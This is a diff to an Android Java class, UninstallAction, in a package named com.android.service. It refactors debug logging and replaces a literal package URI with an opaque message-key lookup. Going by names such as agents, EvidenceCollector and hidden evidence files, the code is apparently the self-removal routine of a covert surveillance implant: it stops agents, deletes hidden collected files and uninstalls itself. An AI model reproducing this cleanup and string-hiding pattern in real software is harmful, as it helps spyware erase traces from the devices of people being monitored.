@@ -11,8 +11,8 @@ package com.android.service.action;
 
 import android.content.Intent;
 import android.net.Uri;
-import android.util.Log;
 
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.agent.AgentManager;
 import com.android.service.auto.Cfg;
@@ -26,7 +26,7 @@ import com.android.service.util.Check;
  */
 public class UninstallAction extends SubAction {
 
-	private static final String TAG = "UninstallAction";
+	private static final String TAG = "UninstallAction"; //$NON-NLS-1$
 
 	/**
 	 * Instantiates a new uninstall action.
@@ -55,10 +55,13 @@ public class UninstallAction extends SubAction {
 	 * Actual execute.
 	 */
 	public static boolean actualExecute() {
-		if(Cfg.DEBUG) Check.log( TAG + " (actualExecute): uninstall");
-		Markup markup=new Markup(0);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualExecute): uninstall") ;//$NON-NLS-1$
+		}
+		final Markup markup = new Markup(0);
 		markup.createEmptyMarkup();
-		
+
 		boolean ret = stopServices();
 		ret &= removeFiles();
 		ret &= deleteApplication();
@@ -68,11 +71,14 @@ public class UninstallAction extends SubAction {
 
 	/**
 	 * Stop agents and events
+	 * 
 	 * @return
 	 */
 	static boolean stopServices() {
-		if (Cfg.DEBUG)
-			Log.d("QZ", TAG + " (stopServices)");
+		if (Cfg.DEBUG) {
+			Check.log( TAG + " (stopServices)") ;//$NON-NLS-1$
+		}
+		
 		AgentManager.self().stopAll();
 		EventManager.self().stopAll();
 		Status.self().unTriggerAll();
@@ -81,26 +87,36 @@ public class UninstallAction extends SubAction {
 
 	/**
 	 * Remove markups and logs
+	 * 
 	 * @return
 	 */
 	static boolean removeFiles() {
-		if (Cfg.DEBUG)
-			Log.d("QZ", TAG + " (removeFiles)");
+		if (Cfg.DEBUG) {
+			Check.log( TAG + " (removeFiles)") ;//$NON-NLS-1$
+		}
+		
 		Markup.removeMarkups();
-		int fileNum = EvidenceCollector.self().removeHidden();
-		if(Cfg.DEBUG) Check.log( TAG + " (removeFiles): " + fileNum);
+
+		final int fileNum = EvidenceCollector.self().removeHidden();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (removeFiles): " + fileNum) ;//$NON-NLS-1$
+		}
 		return true;
 	}
 
 	/**
 	 * Deletes the application
+	 * 
 	 * @return
 	 */
 	static boolean deleteApplication() {
-		if (Cfg.DEBUG)
-			Log.d("QZ", TAG + " (deleteApplication)");
-		Uri packageURI = Uri.parse("package:com.android.service");
-		Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
+		if (Cfg.DEBUG) {
+			Check.log( TAG + " (deleteApplication)") ;//$NON-NLS-1$
+		}
+
+		final Uri packageURI = Uri.parse(Messages.getString("2.0")); //$NON-NLS-1$
+
+		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
 		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 		Status.getAppContext().startActivity(uninstallIntent);
 		return true;
